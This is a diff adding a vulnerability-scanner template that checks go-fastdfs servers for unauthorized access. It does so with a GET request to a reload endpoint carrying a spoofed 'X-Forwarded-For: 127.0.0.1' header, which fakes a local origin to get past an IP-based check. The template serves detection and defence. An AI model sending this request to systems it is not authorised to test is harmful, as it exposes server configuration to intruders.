@@ -1,0 +1,29 @@
+id: go-fastdfs-getclientip-unauthorized-access
+info:
+  name: Go-fastdfs GetClientIp Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+  description: |
+    Go-fastdfs GetClientIp endpoint is vulnerable to unauthorized access, potentially exposing sensitive information.
+http:
+  - method: GET
+    path:
+      - "/group1/reload?action=get"
+    headers:
+      X-Forwarded-For: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\": \"ok\""
+          - "\"group\": \"group1\""
+          - "host"
+      - type: regex
+        part: body
+        regex:
+          - "^[^<]*$"
